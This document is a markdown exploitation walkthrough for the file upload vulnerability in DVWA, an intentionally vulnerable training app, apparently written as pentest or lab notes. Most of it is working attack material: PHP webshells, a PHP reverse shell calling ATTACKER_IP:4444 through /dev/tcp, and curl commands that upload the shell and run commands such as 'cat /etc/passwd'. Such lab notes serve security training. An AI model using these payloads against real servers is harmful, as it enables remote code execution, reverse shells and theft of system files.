# DVWA File Upload — Low Security

## URL
http://127.0.0.1:4280/vulnerabilities/upload/

## Form Details
- Method: POST (multipart/form-data)
- Single file upload field
- Upload directory: `../../hackable/uploads/`
- Uploaded files accessible at: `http://127.0.0.1:4280/hackable/uploads/<filename>`

## Source Code Behavior (Low)
- No file type validation
- No extension check
- No content check
- Directly moves uploaded file to `hackable/uploads/` directory
- `move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)`

## Working Payloads

### Simple PHP webshell
Create `shell.php`:
```php
<?php echo shell_exec($_GET['cmd']); ?>
```

### Detailed PHP webshell
Create `shell.php`:
```php
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```

### PHP reverse shell (use pentestmonkey's)
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>
```

## Step-by-Step Exploitation
1. Create `shell.php` with `<?php echo shell_exec($_GET['cmd']); ?>`
2. Upload via the form
3. Success message shows: `../../hackable/uploads/shell.php succesfully uploaded!`
4. Navigate to `http://127.0.0.1:4280/hackable/uploads/shell.php?cmd=whoami`
5. Server executes the command, displays output

## curl Commands
```bash
# Upload PHP webshell
curl -X POST "http://127.0.0.1:4280/vulnerabilities/upload/" \
  -F "uploaded=@shell.php;type=application/x-php" \
  -F "Upload=Upload" \
  -b "PHPSESSID=<session>;security=low"

# Execute commands via uploaded shell
curl "http://127.0.0.1:4280/hackable/uploads/shell.php?cmd=whoami" \
  -b "PHPSESSID=<session>;security=low"

curl "http://127.0.0.1:4280/hackable/uploads/shell.php?cmd=cat+/etc/passwd" \
  -b "PHPSESSID=<session>;security=low"
```

## Notes
- Any file type accepted — .php, .exe, .sh, anything
- Direct code execution on the server
- Upload path is predictable — files accessible at known URL
- No authentication required to access uploaded files
